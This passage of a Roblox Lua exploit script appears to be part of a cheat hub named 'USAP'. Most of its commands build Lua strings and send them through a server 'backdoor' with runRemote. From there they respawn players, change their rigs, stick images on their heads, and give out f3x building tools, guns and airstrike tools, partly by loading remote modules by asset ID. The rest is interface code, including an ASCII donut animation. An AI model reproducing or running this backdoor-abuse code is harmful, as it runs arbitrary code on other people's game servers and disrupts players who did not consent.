                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], randomPlayer.Name, imageId)
	elseif target == "others" then
		targetScript = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "HeadBillboard"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], localPlayerName, imageId)
	elseif target == "all" then
		targetScript = string.format([[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "HeadBillboard"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], imageId)
	else
		targetScript = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "HeadBillboard"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], target, imageId)
	end

	if targetScript then
		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unheadbillboard", "unheadbb", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function removeBillboardFromHead(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head
			local existingBillboard = head:FindFirstChild("HeadBillboard")
			if existingBillboard then
				existingBillboard:Destroy()
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			removeBillboardFromHead(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			removeBillboardFromHead(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					removeBillboardFromHead(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				removeBillboardFromHead(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removeBillboardFromHead(player)
					break
				end
			end
		end
		return
	end

	local targetScript

	if not target or target == "" or target == "me" then
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("HeadBillboard")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("HeadBillboard")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		targetScript = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		targetScript = [[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]]
	else
		targetScript = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("HeadBillboard")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], target)
	end

	if targetScript then
		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local function getTargetScript(target, actionScript)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function getPlayerRef(playerName)
		return string.format('game:GetService("Players"):FindFirstChild("%s")', playerName)
	end

	local processedActionScript = actionScript
		:gsub("%%replace%%", "%%username%%")
		:gsub("%%otherreplace%%", "%%playerref%%")

	if not target or target == "" or target == "me" then
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', localPlayer.Name))
			:gsub("%%playerref%%", getPlayerRef(localPlayer.Name))
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', randomPlayer.Name))
			:gsub("%%playerref%%", getPlayerRef(randomPlayer.Name))
	elseif target == "others" then
		return string.format([[
            local players = game:GetService("Players"):GetPlayers()
            local localPlayer = game.Players.LocalPlayer
            for _, player in ipairs(players) do
                if player ~= localPlayer then
                    %s
                end
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	elseif target == "all" then
		return string.format([[
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                %s
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	else
		return string.format([[
            local targetName = "%s":lower()
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Name:lower():find(targetName) then
                    %s
                end
            end
        ]], target, processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	end
end

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r6", "r6", function(target)
	if not backdoor then return end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R6)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r15", "r15", function(target)
	if not backdoor then return end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R15)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("respawn", "re", function(target)
	if not backdoor then return end

	local actionScript = "%otherreplace%:LoadCharacter()"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kazotskykick", "kk", function(target)
	if not backdoor then return end

	local actionScript = "require(6728874428).basskick(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("eggdog", "eggdog", function(target)
	if not backdoor then return end

	local actionScript = "require(4460809464).load(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("guns", "guns", function(target)
	if not backdoor then return end

	local actionScript = "require(4922496226).Dreamer(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("btools", "f3x", function(target)
	if not backdoor then return end

	local actionScript = "require(12158566951)(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("tools", "tools", function(target)
	if not backdoor then return end

	local actionScript = "require(4888483885).ok(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("airstriketools", "ast", function(target)
	if not backdoor then return end

	local actionScript = "require(11670894308).Strafe(%replace%)"
	local targetScript = getTargetScript(target, actionScript)

	runRemote(backdoor, targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

donuttabopen = false
donutrunning = nil

addcommand("opendonuttab", "donut", function()
	if donuttabopen then return end
	donuttabreallyminimized = false
	donuttabminimized = false
	donuttabopen = true

	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end

	task.spawn(function()
		donutrunning = unable["run service"].RenderStepped:Connect(function()
			if unable["donut"].TextTransparency == 0 then
				local currenttime = os.clock()
				if currenttime - lastdonutupd >= donutupdinterval then
					lastdonutupd = currenttime

					for i = 1, 22 do
						framebuffer[i] = {}
						for j = 1, 80 do
							framebuffer[i][j] = ' '
						end
					end

					local zBuffer = table.create(1760, 0)

					for j = 0, pi2, 0.07 do
						local sinJ = sin(j)
						local cosJ = cos(j)
						local sinA = sin(A)
						local cosA = cos(A)
						local sinB = sin(B)
						local cosB = cos(B)

						for i = 0, pi2, 0.02 do
							local sinI = sin(i)
							local cosI = cos(i)

							local h = cosJ + 2
							local D = 1 / (sinI * h * sinA + sinJ * cosA + 5)
							local t = sinI * h * cosA - sinJ * sinA

							local x = floor(40 + 30 * D * (cosI * h * cosB - t * sinB))
							local y = floor(12 + 15 * D * (cosI * h * sinB + t * cosB))
							local o = x + 80 * y

							if y >= 0 and y < 22 and x >= 0 and x < 80 then
								local N = floor(8 * ((sinJ * sinA - sinI * cosJ * cosA) * cosB - 
									sinI * cosJ * sinA - sinJ * cosA - 
									cosI * cosJ * sinB))

								if D > zBuffer[o] then
									zBuffer[o] = D
									framebuffer[y+1][x+1] = chars[clamp(N, 1, 12)]
								end
							end
						end
					end

					local output = {}
					for y = 1, 22 do
						output[y] = table.concat(framebuffer[y])
					end
					unable["donut"].Text = table.concat(output, "\n")

					A = A + 0.04
					B = B + 0.08
				end
			end
		end)
	end)

	unable["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
	unable["donut tab top bar minimize button"].Text = "-"
	unable["donut tab block main frame"].BackgroundTransparency = 1
	centerdonuttabtopbar()
	unable["donut tab main frame 1"].Visible = true
	local gui = unable["donut tab block all"]
	unable["donut tab top bar"].Visible = true
	unable["donut tab top bar"].TextTransparency = 1
	unable["donut tab top bar"].BackgroundTransparency = 1
	unable["donut tab main frame 1"].BackgroundTransparency = 1
	unable["donut tab top bar close button"].BackgroundTransparency = 1
	unable["donut tab top bar minimize button"].BackgroundTransparency = 1
	unable["donut tab top bar reposition button"].BackgroundTransparency = 1
	unable["donut tab top bar close button"].TextTransparency = 1
	unable["donut tab top bar minimize button"].TextTransparency = 1
	unable["donut tab top bar reposition button"].TextTransparency = 1
	unable["donut tab main frame 1"].BackgroundTransparency = 1
	unable["donut"].BackgroundTransparency = 1
	unable["donut"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 276, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 276, 0, 260),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	unable["donut tab top bar"].Visible = true
	unable["donut tab top bar"].BackgroundTransparency = 0
	unable["donut tab main frame 1"].BackgroundTransparency = 0
	unable["donut tab top bar close button"].BackgroundTransparency = 0
	unable["donut tab top bar minimize button"].BackgroundTransparency = 0
	unable["donut tab top bar reposition button"].BackgroundTransparency = 0
	unable["donut tab top bar close button"].TextTransparency = 0
	unable["donut tab top bar minimize button"].TextTransparency = 0
	unable["donut tab top bar reposition button"].TextTransparency = 0
	unable["donut tab top bar"].TextTransparency = 0
	unable["donut tab main frame 1"].BackgroundTransparency = 0
	unable["donut"].BackgroundTransparency = 0
	unable["donut"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

binarytabopen = false
binaryrunning = nil

addcommand("openbinarytab", "binary", function()
	if binarytabopen then return end
	binarytabreallyminimized = false
	binarytabopen = true
	binarytabminimized = false

	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end

	spawn(function()
		binaryrunning = unable["run service"].RenderStepped:Connect(function()
			if unable["binary"].TextTransparency == 0 then
				changebinary()
			end
		end)
	end)

	unable["binary tab block main frame"].Size = UDim2.new(0, 246, 0, 203)
	unable["binary tab block main frame"].BackgroundTransparency = 1
	unable["binary tab top bar minimize button"].Text = "-"
	centerbinarytabtopbar()
	unable["binary tab main frame 1"].Visible = true
	local gui = unable["binary tab block all"]
	unable["binary tab top bar"].Visible = true
	unable["binary tab top bar"].TextTransparency = 1
	unable["binary tab top bar"].BackgroundTransparency = 1
	unable["binary tab main frame 1"].BackgroundTransparency = 1
	unable["binary tab top bar close button"].BackgroundTransparency = 1
	unable["binary tab top bar minimize button"].BackgroundTransparency = 1
	unable["binary tab top bar reposition button"].BackgroundTransparency = 1
	unable["binary tab top bar close button"].TextTransparency = 1
	unable["binary tab top bar minimize button"].TextTransparency = 1
	unable["binary tab top bar reposition button"].TextTransparency = 1
	unable["binary tab main frame 1"].BackgroundTransparency = 1
	unable["binary"].BackgroundTransparency = 1
	unable["binary"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 246, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 246, 0, 230),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	unable["binary tab top bar"].Visible = true
	unable["binary tab top bar"].BackgroundTransparency = 0
	unable["binary tab main frame 1"].BackgroundTransparency = 0
	unable["binary tab top bar close button"].BackgroundTransparency = 0
	unable["binary tab top bar minimize button"].BackgroundTransparency = 0
	unable["binary tab top bar reposition button"].BackgroundTransparency = 0
	unable["binary tab top bar close button"].TextTransparency = 0
	unable["binary tab top bar minimize button"].TextTransparency = 0
	unable["binary tab top bar reposition button"].TextTransparency = 0
	unable["binary tab top bar"].TextTransparency = 0
	unable["binary tab main frame 1"].BackgroundTransparency = 0
	unable["binary"].BackgroundTransparency = 0
	unable["binary"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

------------------------------------- thank you chatgpt for fixing some of the code above -------------------------------------

movebutton()
toggleLoop(false)

canpress = false

local tivb = unable["toggle interface visibility button?"]
tivb.Text = "NX⁵"

local tout = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tin = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

local fout = unable["tween service"]:Create(tivb, tout, {TextTransparency = 1})
wait(1)
fout:Play()

fout.Completed:Connect(function()
	tivb.Text = "USAP\nv" .. unable["version"]
	tivb.TextSize = 18
	local fin2 = unable["tween service"]:Create(tivb, tin, {TextTransparency = 0})
	fin2:Play()
	fin2.Completed:Connect(function()
		local fout2 = unable["tween service"]:Create(tivb, tout, {TextTransparency = 1})
		wait(1)
		fout2:Play()
		fout2.Completed:Connect(function()
			tivb.TextSize = 20
			local shufflefaces = true
			spawn(function()
				local expressions = {
					"o.<", ">.-", "^.o", "o.^", "-.ó", "ò.-", "^.ó", "-.^",
					">.ó", "ò.<", "^.-", ">.^", "-.<", ">.o", "ò.^", ">.o",
					"=.^", "~.o", "o.~", "=.<", ">.~", "~.-", "^.~", "~.^",
					"~.<", "=.o", "=.ó", "ò.~", "~.ó", "=.=", "~.~", "=.~",
					">.=", "~.~", "ó.=", "o.<", "-.o", "^.="
				}

				while shufflefaces == true do
					local shuffled = {}
					for _, v in ipairs(expressions) do table.insert(shuffled, v) end
					for i = #shuffled, 2, -1 do local j = math.random(i) shuffled[i], shuffled[j] = shuffled[j], shuffled[i] end
					for _, face in ipairs(shuffled) do tivb.Text = face wait() end
				end
			end)
			local fin = unable["tween service"]:Create(tivb, tin, {TextTransparency = 0})
			fin:Play()
			fin.Completed:Connect(function()
				local beep = Instance.new("Sound")
				beep.SoundId = "rbxassetid://8458409341"
				beep.Parent = unable["local player"]
				beep.Volume = 1
				beep.Name = "canttouchthis"
				beep.PlayOnRemove = true
				wait(math.random(1, 2)) shufflefaces = false
				tivb:Destroy()
				toggleLoop(true)
				canpress = true
				beep:Destroy()
			end)
		end)
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------
